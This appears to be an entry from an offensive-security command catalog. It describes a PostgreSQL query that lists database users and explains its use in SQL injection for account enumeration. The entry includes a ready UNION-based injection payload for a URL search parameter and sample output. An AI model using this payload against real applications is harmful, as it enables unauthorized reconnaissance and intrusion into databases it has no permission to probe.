---
type: command
executor: sql
data: SELECT usename FROM pg_user
output: null
created_at: '2023-10-01T00:00:00Z'
updated_at: '2023-10-01T00:00:00Z'
platforms:
  - Linux
  - Web
tags:
  - postgresql
  - sql-injection
  - discovery
verified: true
validated: true
---

# postgresql-select-users-from-pg-user

## Command

```sql
SELECT usename FROM pg_user
```

## Description

This SQL command queries the PostgreSQL system catalog to retrieve a list of all database usernames. It is used in SQL injection attacks to enumerate accounts when direct access is unavailable, helping attackers map the database's user structure for further exploitation.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| None | The query has no parameters; it directly selects from the pg_user table. | N/A |

## Examples

### Basic Usage

In a direct psql session or injected via a vulnerable app:

```sql
SELECT usename FROM pg_user;
```

### Injected Usage (UNION-based)

Append to an existing query in a URL: `?search=1' UNION SELECT usename FROM pg_user--`

## Expected Output

A list of usernames, for example:

```
 usename 
---------
 postgres
 appuser 
 admin   
(3 rows)
```

In an injection context, usernames may appear in the web page content, error messages, or response body.

## Related

- [[procedures/PostgreSQL-User-Enumeration-via-SQL-Injection]]
- [[techniques/T1087]]
